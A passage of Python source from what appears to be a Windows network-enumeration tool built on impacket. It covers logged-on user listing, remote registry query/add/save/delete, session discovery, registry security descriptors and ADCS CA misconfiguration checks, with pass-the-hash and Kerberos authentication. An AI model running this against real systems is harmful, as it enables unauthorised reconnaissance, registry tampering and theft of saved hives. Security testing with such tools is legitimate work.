			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('6BFFD098-A112-3610-9833-46C3F87E345A', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		res = wkst.hNetrWkstaUserEnum(dce, 1)
		for session in res['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
			username = session['wkui1_username'][:-1]
			logonDomain = session['wkui1_logon_domain'][:-1]
			print(f"[+] {logonDomain}\\{username} logged in")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###################################################
#   [MS-RRP] = Windows Remote Registry Protocol   #
#              Interface = WINREG                 #
###################################################

from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.dtypes import READ_CONTROL

regTypes = {0: 'REG_NONE', 1: 'REG_SZ', 2: 'REG_EXPAND_SZ', 3: 'REG_BINARY', 4: 'REG_DWORD',
		5: 'REG_DWORD_BIG_ENDIAN', 6: 'REG_LINK', 7: 'REG_MULTI_SZ', 11: 'REG_QWORD'}

def stripRootKey(dce, keyName):
	# Let's strip the root key
	try:
		rootKey = keyName.split('\\')[0]
		subKey = '\\'.join(keyName.split('\\')[1:])
	except Exception:
		raise Exception("Error parsing keyName '%s'" % keyName)
	if rootKey.upper() == 'HKLM':
		ans = rrp.hOpenLocalMachine(dce)
	elif rootKey.upper() == 'HKCU':
		ans = rrp.hOpenCurrentUser(dce)
	elif rootKey.upper() == 'HKCR':
		ans = rrp.hOpenClassesRoot(dce)
	elif rootKey.upper() == 'HKU':
		ans = rrp.hOpenUsers(dce)
	elif rootKey.upper() == 'HKCC':
		ans = rrp.hOpenCurrentConfig(dce)
	else:
		raise Exception("Invalid root key '%s'" % rootKey)
	hRootKey = ans['phKey']
	return hRootKey, subKey

def printKeyValues(dce, keyHandler, nbTab):
	i = 0
	while True:
		try:
			ans4 = rrp.hBaseRegEnumValue(dce, keyHandler, i)
			lp_value_name = ans4['lpValueNameOut'][:-1]
			if len(lp_value_name) == 0:
				lp_value_name = '(Default)'
			lp_type = ans4['lpType']
			lp_data = b''.join(ans4['lpData'])
			print('\t' * nbTab + lp_value_name + '\t' + regTypes.get(lp_type, 'KEY_NOT_FOUND') + '\t', end = ' ')
			parseData(lp_type, lp_data, nbTab + 1)
			i += 1
		except Exception as e:
			if str(e).find("ERROR_NO_MORE_ITEMS") >= 0:
				break
			else:
				raise e

def printAllSubkeysAndEntries(dce, keyName, keyHandler, nbTab):
	index = 0
	while True:
		try:
			maybeSleep()
			subkey = rrp.hBaseRegEnumKey(dce, keyHandler, index)
			index += 1
			res = rrp.hBaseRegOpenKey(dce, keyHandler, subkey['lpNameOut'], samDesired = rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS)
			newKeyName = keyName + subkey['lpNameOut'][:-1] + '\\'
			print('\t' * nbTab + newKeyName)
			printKeyValues(dce, res['phkResult'], nbTab + 1)
			printAllSubkeysAndEntries(dce, newKeyName, res['phkResult'], nbTab + 1)
		except Exception as e:
			if str(e).find("ERROR_NO_MORE_ITEMS") >= 0:
				break
			elif str(e).find('access_denied') >= 0:
				print('\t' * nbTab + "[-] Cannot access subkey '%s', bypassing it" % subkey['lpNameOut'][:-1])
				continue
			elif str(e).find('rpc_x_bad_stub_data') >= 0:
				print('\t' * nbTab + "[-] Fault call, cannot retrieve value for '%s', bypassing it" % subkey['lpNameOut'][:-1])
				return
			else:
				raise e

def parseData(valueType, valueData, nbTab):
	from struct import unpack
	from impacket.structure import hexdump

	try:
		if valueType == rrp.REG_SZ or valueType == rrp.REG_EXPAND_SZ:
			if type(valueData) is int:
				print('NULL')
			else:
				print("%s" % (valueData.decode('utf-16le')))
		elif valueType == rrp.REG_BINARY:
			print('')
			hexdump(valueData, '\t' * nbTab)
		elif valueType == rrp.REG_DWORD:
			print("0x%x" % (unpack('<L', valueData)[0]))
		elif valueType == rrp.REG_QWORD:
			print("0x%x" % (unpack('<Q', valueData)[0]))
		elif valueType == rrp.REG_NONE:
			try:
				if len(valueData) > 1:
					print('')
					hexdump(valueData, '\t')
				else:
					print("NULL")
			except:
				print("NULL")
		elif valueType == rrp.REG_MULTI_SZ:
			print("%s" % (valueData.decode('utf-16le')[:-2]))
		else:
			print("Unknown Type 0x%x!" % valueType)
			hexdump(valueData)
	except Exception as e:
		print('Exception when printing reg value: %s' % str(e))
		pass

def extractKeys(cmd):
	# Regular expression to match words within single quotes, double quotes, and words without quotes
	pattern = r"'[^']*'|\"[^\"]*\"|\S+"
	# Find all matches using the pattern
	words = re.findall(pattern, cmd)
	# Remove surrounding quotes from extracted words
	words = [word.strip("'\"") for word in words]

	return words

def regCMD(ip, user, pwd, domain, nthash, aesKey, ccache, cmd, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	# The service 'RemoteRegistry' expose the WINREG interface through ncacn_np:<IP>[\pipe\winreg]
	# BUT It can be stopped/disabled
	# Start It first
	#	1- By using the SVCCTL interface to start directly the service 'RemoteRegistry' (Require administrative rights)
	#	2- By trying to connect to the WINREG interface once in hope that the service 'RemoteRegistry' will be activated automatically after few seconds
	###

	print_yellow("[*] Querying WINREG interface")
	print_yellow("---")
	print()

	try:
		useSVCCTL = False
		if useSVCCTL:
			print("[+] Starting RemoteRegistry service on remote host through SVCCTL interface")
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				started = startService(ip, user, pwd, domain, nthash, aesKey, ccache, "RemoteRegistry")
			except:
				sys.stdout = originalSTDOUT
				raise
			sys.stdout = originalSTDOUT
			if started:
				print("[+] Service RemoteRegistry started")
			else:
				print("[-] Failed to start RemoteRegistry Service. Exit", file = sys.stderr)
				return
		else:
			print("[+] Try to start RemoteRegistry service by connecting to the WINREG interface once")
			# Connect to the interface WINREG
			try:
				if alternateBinding == None:
					rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
				else:
					rpctransport = transport.DCERPCTransportFactory(alternateBinding)
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						rpctransport._doKerberos = True
						if (ccache != None):
							import os
							os.environ["KRB5CCNAME"] = ccache
					rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
				dce = rpctransport.get_dce_rpc()
				dce.connect()
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
				if alternateInterface == None:
					dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
				else:
					dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
				print("[+] Service already started")
			except Exception as e:
				if str(e).find("STATUS_PIPE_NOT_AVAILABLE") >= 0:
					print("[+] Expected error 'STATUS_PIPE_NOT_AVAILABLE'. Waiting few seconds and retry")
					time.sleep(2)
				else:
					raise

		# Connect to the interface WINREG
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		ACTION = cmd.split(" ")[1].upper()
		keys = extractKeys(cmd)[2:]
		if ACTION == 'QUERY':
			regQuery(dce, keys)
		elif ACTION == 'ADD':
			regAdd(dce, keys)
		elif ACTION == 'SAVE':
			regSave(dce, keys)
		elif ACTION == 'DELETE':
			regDelete(dce, keys)
		else:
			print("[-] Unknown registry action %s" % ACTION, file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def regSave(dce, keys):
	keyName = keys[0]
	hRootKey, subKey = stripRootKey(dce, keyName)
	outputFileName = keys[1]

	print("[+] Save key '%s'" % keyName)

	try:
		ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions = rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired = rrp.KEY_READ)
		rrp.hBaseRegSaveKey(dce, ans2['phkResult'], outputFileName)
		print("[+] Saved '%s' to '%s'" % (keyName, outputFileName))
	except Exception as e:
		print("[-] Couldn't save '%s': %s" % (keyName, str(e)), file = sys.stderr)

def regQuery(dce, keys):
	keyName = keys[0]
	hRootKey, subKey = stripRootKey(dce, keyName)
	try:
		option = keys[1]
	except:
		option = ''
	try:
		optionKey = keys[2]
	except:
		optionKey = ''

	if (optionKey != ''):
		print("[+] Query entry '%s' of key '%s'" % (optionKey, keyName))
	elif (option == "/ve"):
		print("[+] Query default entry of key '%s'" % keyName)
	elif (option == "/s"):
		print("[+] Query recursively key '%s'" % keyName)
	else:
		print("[+] Query key '%s'" % keyName)

	res = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, samDesired = rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)

	if option == "/v":
		try:
			res = rrp.hBaseRegQueryValue(dce, res['phkResult'], optionKey)
			valType = regTypes.get(res[0], 'KEY_NOT_FOUND')
			value = str(res[1])
			print(f"\t{optionKey}\t{valType}\t{value}")
		except Exception as e:
			if (str(e).find("ERROR_FILE_NOT_FOUND") >= 0):
				print("[-] Entry does not exist", file = sys.stderr)
			else:
				print("[-] Unknown error: %s" % str(e), file = sys.stderr)
	elif option == "/ve":
		try:
			res = rrp.hBaseRegQueryValue(dce, res['phkResult'], '')
			valType = regTypes.get(res[0], 'KEY_NOT_FOUND')
			value = str(res[1])
			print(f"\t(Default)\t{valType}\t{value}")
		except Exception as e:
			if (str(e).find("ERROR_FILE_NOT_FOUND") >= 0):
				print("[-] No default entry for key", file = sys.stderr)
			else:
				print("[-] Unknown error: %s" % str(e), file = sys.stderr)
	elif option == "/s":
		printAllSubkeysAndEntries(dce, subKey + '\\', res['phkResult'], 1)
	else:
		printKeyValues(dce, res['phkResult'], 1)
		i = 0
		while True:
			try:
				subKey = rrp.hBaseRegEnumKey(dce, res['phkResult'], i)['lpNameOut'][:-1]
				print(f"\t{keyName}\\{subKey}")
				i += 1
			except Exception:
				break
				# ans5 = rrp.hBaseRegGetVersion(dce, res['phkResult'])
				# ans3 = rrp.hBaseRegEnumKey(dce, res['phkResult'], 0)

def regAdd(dce, keys):
	keyName = keys[0]
	hRootKey, subKey = stripRootKey(dce, keyName)
	option = keys[1]
	if (option == "/ve"):
		entryName = ''
		entryType = keys[3]
		entryData = keys[5]
	else:
		entryName = keys[2]
		entryType = keys[4]
		entryData = keys[6]

	if (entryName != ''):
		print("[+] Add entry '%s' into key '%s'" % (entryName, keyName))
	else:
		print("[+] Add default entry into key '%s'" % keyName)

	try:
		res = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, samDesired = READ_CONTROL | rrp.KEY_SET_VALUE | rrp.KEY_CREATE_SUB_KEY)
	except Exception as e:
		if (str(e).find("rpc_s_access_denied") >= 0):
			print("[-] Access denied to open key", file = sys.stderr)
		else:
			print("[-] Got error while opening key: '%s'" % keyName, file = sys.stderr)
		return
	dwType = getattr(rrp, entryType, None)
	if dwType is None or not entryType.startswith('REG_'):
		print("[-] Error parsing entry type '%s'" % dwType, file = sys.stderr)
		return

	# Fix (?) for packValue function
	if dwType in (rrp.REG_DWORD, rrp.REG_DWORD_BIG_ENDIAN, rrp.REG_DWORD_LITTLE_ENDIAN,
		rrp.REG_QWORD, rrp.REG_QWORD_LITTLE_ENDIAN):
		valueData = int(entryData)
	else:
		valueData = entryData

	res = rrp.hBaseRegSetValue(dce, res['phkResult'], entryName, dwType, valueData)
	if res['ErrorCode'] == 0:
		if (entryName != ''):
			print("[+] Successfully set entry '%s\\%s' of type %s to value '%s'" % (keyName, entryName, entryType, valueData))
		else:
			print("[+] Successfully set default entry of type %s to value '%s' for key '%s'" % (entryType, valueData, keyName))
	else:
		if (entryName != ''):
			print("[-] Error 0x%08x while setting entry '%s\\%s' of type %s to value '%s'" % (res['ErrorCode'], keyName, entryName, entryType, valueData), file = sys.stderr)
		else:
			print("[-] Error 0x%08x while setting default entry of type %s to value '%s' for key '%s'" % (res['ErrorCode'], entryType, valueData, keyName), file = sys.stderr)

def regDelete(dce, keys):
	keyName = keys[0]
	hRootKey, subKey = stripRootKey(dce, keyName)
	option = keys[1]
	if (option == "/v"):
		entryName = keys[2]
	else:
		entryName = ''

	if (entryName != ''):
		print("[+] Delete entry '%s' into key '%s'" % (entryName, keyName))
		res = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, samDesired = READ_CONTROL | rrp.KEY_SET_VALUE | rrp.KEY_CREATE_SUB_KEY)
		res = rrp.hBaseRegDeleteValue(dce, res['phkResult'], entryName)
		if res['ErrorCode'] == 0:
			print("[+] Successfully deleted entry '%s\\%s'" % (keyName, entryName))
		else:
			print("[-] Error 0x%08x while deleting entry '%s\\%s'" % (res['ErrorCode'], keyName, entryName), file = sys.stderr)
	else:
		if (option == "/ve"):
			print("[+] Delete default entry into key '%s'" % keyName)
			res = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, samDesired = READ_CONTROL | rrp.KEY_SET_VALUE | rrp.KEY_CREATE_SUB_KEY)
			res = rrp.hBaseRegDeleteValue(dce, res['phkResult'], '')
			if res['ErrorCode'] == 0:
				print("[+] Successfully deleted default entry for key '%s'" % keyName)
			else:
				print("[-] Error 0x%08x while deleting default entry for key '%s'" % (res['ErrorCode'], keyName), file = sys.stderr)
		elif (option == "/va"):
			print("[+] Delete all entries into key '%s'" % keyName)
			res1 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, samDesired = rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS)
			i = 0
			allSubKeys = []
			while True:
				try:
					res2 = rrp.hBaseRegEnumValue(dce, res1['phkResult'], i)
					lp_value_name = res2['lpValueNameOut'][:-1]
					allSubKeys.append(lp_value_name)
					i += 1
				except rrp.DCERPCSessionError as e:
					if str(e).find("ERROR_NO_MORE_ITEMS") >= 0:
							break

			res1 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, samDesired = rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS)
			for subKey in allSubKeys:
				try:
					res2 = rrp.hBaseRegDeleteValue(dce, res1['phkResult'], subKey)
					if (subKey == ''):
						subKey = "(Default)"
					if res2['ErrorCode'] == 0:
						print("[+] Successfully deleted entry '%s\\%s'" % (keyName, subKey))
					else:
						print("[-] Error 0x%08x in deletion of entry '%s\\%s'" % (res2['ErrorCode'], keyName, subKey), file = sys.stderr)
				except Exception as e:
					if (subKey == ''):
						subKey = "(Default)"
					print("[-] Unhandled error %s in deletion of entry '%s\\%s'" % (str(e), keyName, subKey), file = sys.stderr)
		else:
			print("[-] Unknown option: %s" % option, file = sys.stderr)

def listRegSessions(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	# The service 'RemoteRegistry' expose the WINREG interface through ncacn_np:<IP>[\pipe\winreg]
	# BUT It can be stopped/disabled
	# Start It first
	#	 1- By using the SVCCTL interface to start directly the service 'RemoteRegistry' (Require administrative rights)
	#	 2- By trying to connect to the WINREG interface once in hope that the service 'RemoteRegistry' will be activated automatically after few seconds
	###

	print_yellow("[*] Listing sessions on remote host")
	print_yellow("---")
	print()

	try:
		useSVCCTL = False
		if useSVCCTL:
			print("[+] Starting RemoteRegistry service on remote host through SVCCTL interface")
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				started = startService(ip, user, pwd, domain, nthash, aesKey, ccache, "RemoteRegistry")
			except:
				sys.stdout = originalSTDOUT
				raise
			sys.stdout = originalSTDOUT
			if started:
				print("[+] Service RemoteRegistry started")
			else:
				print("[-] Failed to start RemoteRegistry Service. Exit", file = sys.stderr)
				return
		else:
			print("[+] Try to start RemoteRegistry service by connecting to the WINREG interface once")
			# Connect to the interface WINREG
			try:
				if alternateBinding == None:
					rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
				else:
					rpctransport = transport.DCERPCTransportFactory(alternateBinding)
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						rpctransport._doKerberos = True
						if (ccache != None):
							import os
							os.environ["KRB5CCNAME"] = ccache
					rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
				dce = rpctransport.get_dce_rpc()
				dce.connect()
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
				if alternateInterface == None:
					dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
				else:
					dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
				print("[+] Service already started")
			except Exception as e:
				if str(e).find("STATUS_PIPE_NOT_AVAILABLE") >= 0:
					print("[+] Expected error 'STATUS_PIPE_NOT_AVAILABLE'. Waiting few seconds and retry")
					time.sleep(2)
				else:
					raise

		# Connect to the interface WINREG
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		hRootKey = rrp.hOpenUsers(dce)['phKey']
		index = 1
		SESSIONS = []
		originalSTDOUT = sys.stdout
		sys.stdout = StringIO()
		while True:
			try:
				res = rrp.hBaseRegEnumKey(dce, hRootKey, index)
				SIDString = res['lpNameOut'].rstrip('\0')
				if SIDString.startswith("S-") and not SIDString.endswith("Classes"):
					SESSIONS.append(SIDToName(ip, user, pwd, domain, nthash, aesKey, ccache, SIDString))
				index += 1
			except:
				break
		sys.stdout = originalSTDOUT
		for session in SESSIONS:
			print(f"[+] {session}")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def printAllSubkeysAndEntriesSD(dce, keyName, keyHandler, nbTab):
	index = 0
	while True:
		try:
			maybeSleep()
			subkey = rrp.hBaseRegEnumKey(dce, keyHandler, index)
			index += 1
			res = rrp.hBaseRegOpenKey(dce, keyHandler, subkey['lpNameOut'], samDesired = rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS)
			newKeyName = keyName + subkey['lpNameOut'][:-1] + '\\'
			sys.stdout.write('\t' * nbTab + newKeyName + " ")
			sdBytes = b"".join(rrp.hBaseRegGetKeySecurity(dce, keyHandler, 0x4)['pRpcSecurityDescriptorOut']['lpSecurityDescriptor']) # 0x4 = DACL_SECURITY_INFORMATION
			print(base64.b64encode(sdBytes).decode())
			printAllSubkeysAndEntriesSD(dce, newKeyName, res['phkResult'], nbTab + 1)
		except Exception as e:
			if str(e).find("ERROR_NO_MORE_ITEMS") >= 0:
				break
			elif str(e).find('access_denied') >= 0:
				print('\t' * nbTab + "[-] Cannot access subkey '%s', bypassing it" % subkey['lpNameOut'][:-1])
				continue
			elif str(e).find('rpc_x_bad_stub_data') >= 0:
				print('\t' * nbTab + "[-] Fault call, cannot retrieve value for '%s', bypassing it" % subkey['lpNameOut'][:-1])
				return
			else:
				raise e

def listRegSD(ip, user, pwd, domain, nthash, aesKey, ccache, rootKey, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	# The service 'RemoteRegistry' expose the WINREG interface through ncacn_np:<IP>[\pipe\winreg]
	# BUT It can be stopped/disabled
	# Start It first
	#	1- By using the SVCCTL interface to start directly the service 'RemoteRegistry' (Require administrative rights)
	#	2- By trying to connect to the WINREG interface once in hope that the service 'RemoteRegistry' will be activated automatically after few seconds
	###

	print_yellow("[*] Displaying Security Descriptor of registry")
	print_yellow("---")
	print()

	try:
		useSVCCTL = False
		if useSVCCTL:
			print("[+] Starting RemoteRegistry service on remote host through SVCCTL interface")
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				started = startService(ip, user, pwd, domain, nthash, aesKey, ccache, "RemoteRegistry")
			except:
				sys.stdout = originalSTDOUT
				raise
			sys.stdout = originalSTDOUT
			if started:
				print("[+] Service RemoteRegistry started")
			else:
				print("[-] Failed to start RemoteRegistry Service. Exit", file = sys.stderr)
				return
		else:
			print("[+] Try to start RemoteRegistry service by connecting to the WINREG interface once")
			# Connect to the interface WINREG
			try:
				if alternateBinding == None:
					rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
				else:
					rpctransport = transport.DCERPCTransportFactory(alternateBinding)
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						rpctransport._doKerberos = True
						if (ccache != None):
							import os
							os.environ["KRB5CCNAME"] = ccache
					rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
				dce = rpctransport.get_dce_rpc()
				dce.connect()
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
				if alternateInterface == None:
					dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
				else:
					dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
				print("[+] Service already started")
			except Exception as e:
				if str(e).find("STATUS_PIPE_NOT_AVAILABLE") >= 0:
					print("[+] Expected error 'STATUS_PIPE_NOT_AVAILABLE'. Waiting few seconds and retry")
					time.sleep(2)
				else:
					raise

		# Connect to the interface WINREG
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		if rootKey.upper() == 'HKLM':
			ans = rrp.hOpenLocalMachine(dce)
		elif rootKey.upper() == 'HKCU':
			ans = rrp.hOpenCurrentUser(dce)
		elif rootKey.upper() == 'HKCR':
			ans = rrp.hOpenClassesRoot(dce)
		elif rootKey.upper() == 'HKU':
			ans = rrp.hOpenUsers(dce)
		elif rootKey.upper() == 'HKCC':
			ans = rrp.hOpenCurrentConfig(dce)
		hRootKey = ans['phKey']
		printAllSubkeysAndEntriesSD(dce, rootKey + "\\", hRootKey, 0)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getCAConfigRRP(ip, user, pwd, domain, nthash, aesKey, ccache, caName, caFQDN, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	###

	print_yellow("[*] Getting ADCS Certificate Authority configuration [MS-RRP]")
	print_yellow("---")
	print()

	try:
		useSVCCTL = False
		if useSVCCTL:
			print("[+] Starting RemoteRegistry service on remote host through SVCCTL interface")
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				started = startService(ip, user, pwd, domain, nthash, aesKey, ccache, "RemoteRegistry")
			except:
				sys.stdout = originalSTDOUT
				raise
			sys.stdout = originalSTDOUT
			if started:
				print("[+] Service RemoteRegistry started")
			else:
				print("[-] Failed to start RemoteRegistry Service. Exit", file = sys.stderr)
				return
		else:
			print("[+] Try to start RemoteRegistry service by connecting to the WINREG interface once")
			# Connect to the interface WINREG
			try:
				if alternateBinding == None:
					rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
				else:
					rpctransport = transport.DCERPCTransportFactory(alternateBinding)
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						rpctransport._doKerberos = True
						if (ccache != None):
							import os
							os.environ["KRB5CCNAME"] = ccache
					rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
				dce = rpctransport.get_dce_rpc()
				dce.connect()
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
				if alternateInterface == None:
					dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
				else:
					dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
				print("[+] Service already started")
			except Exception as e:
				if str(e).find("STATUS_PIPE_NOT_AVAILABLE") >= 0:
					print("[+] Expected error 'STATUS_PIPE_NOT_AVAILABLE'. Waiting few seconds and retry")
					time.sleep(2)
				else:
					raise

		# Connect to the interface WINREG
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\winreg]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('338CD001-2244-31F1-AAAA-900038001003', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		hRootKey = rrp.hOpenLocalMachine(dce)['phKey']
		policyKey = rrp.hBaseRegOpenKey(dce, hRootKey, "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\%s\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy" % caName)
		_, editFlags = rrp.hBaseRegQueryValue(dce, policyKey["phkResult"], "EditFlags")
		if editFlags:
			userSpecifiedSAN = "Enabled" if (editFlags & 0x00040000) == 0x00040000 else "Disabled"
		else:
			userSpecifiedSAN = "Unknown"
		_, requestDisposition = rrp.hBaseRegQueryValue(dce, policyKey["phkResult"], "RequestDisposition")
		if requestDisposition:
			requestDisposition = "Pending" if requestDisposition & 0x100 else "Issue"
		else:
			requestDisposition = "Unknown"
		configurationKey = rrp.hBaseRegOpenKey(dce, hRootKey, "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\%s" % caName)
		_, interfaceFlags = rrp.hBaseRegQueryValue(dce, configurationKey["phkResult"], "InterfaceFlags")
		if interfaceFlags:
			enforceEncICertReq = "Enabled" if (interfaceFlags & 0x00000200) == 0x00000200 else "Disabled"
		else:
			enforceEncICertReq = "Unknown"
		sd = LDAPUtil.SECURITY_DESCRIPTOR.from_bytes(rrp.hBaseRegQueryValue(dce, configurationKey["phkResult"], "Security")[1])
	
		try:
			res = requests.head(f"http://{caFQDN}/certsrv/", timeout = 3)
			webEnrollment = True if res.status_code != 404 else False
		except Exception as e:
			try:
				res = requests.head(f"https://{caFQDN}/certsrv/", timeout = 3, verify = False)
				webEnrollment = True if res.status_code != 404 else False
			except Exception as e:
				webEnrollment = False
		
		print(f"[+] User specified SAN = {userSpecifiedSAN}\n[+] Request disposition = {requestDisposition}\n[+] Encrypted certificate request required = {enforceEncICertReq}\n[+] Web enrollment = {webEnrollment}\n[+] Security Descriptor = {sd.to_sddl(ace_rights_adcs = True)}")
		return (userSpecifiedSAN, requestDisposition, enforceEncICertReq, sd, webEnrollment)

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return

##################################################################################
#   [MS-LSAT] = Local Security Authority (Translation Methods) Remote Protocol   #
